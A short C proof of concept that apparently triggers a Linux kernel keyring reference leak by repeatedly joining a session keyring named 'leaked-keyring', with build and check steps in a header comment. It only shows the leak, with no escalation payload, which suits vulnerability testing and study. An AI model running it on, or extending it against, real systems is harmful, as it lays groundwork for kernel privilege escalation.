/* 
    if ubuntu: install libkeyutils-dev
    $ gcc leak.c -o leak -lkeyutils -Wall
    $ ./leak 
    $ cat /proc/keys 
*/

#include <stddef.h>
#include <stdio.h>
#include <sys/types.h>
#include <keyutils.h>

int main(int argc, const char *argv[]){
    /* Old Ubuntu version doesn't have keyring enabled by default.  But I noticed proc/keys
      appears after fork, so maybe this will work */
    pid_t  pid;
    pid = fork();
    if (pid){
      //printf("This is the parent process. My pid is %d and my parent's id is %d.\n", getpid(), getppid() );
      return 0;
    } 
    else{
      printf("This is the child process. My pid is %d and my parent's id is %d.\n", getpid(),getppid());
    } 

    int i = 0;
    key_serial_t serial;

    serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, "leaked-keyring");
    if (serial < 0) {
        perror("keyctl");
        return -1;
    }

    if (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL) < 0) {
        perror("keyctl");
        return -1;
    }

    for (i = 0; i < 100; i++) {
        serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, "leaked-keyring");
        if (serial < 0) {
            perror("keyctl");
            return -1;
        }
    }

    return 0;
}
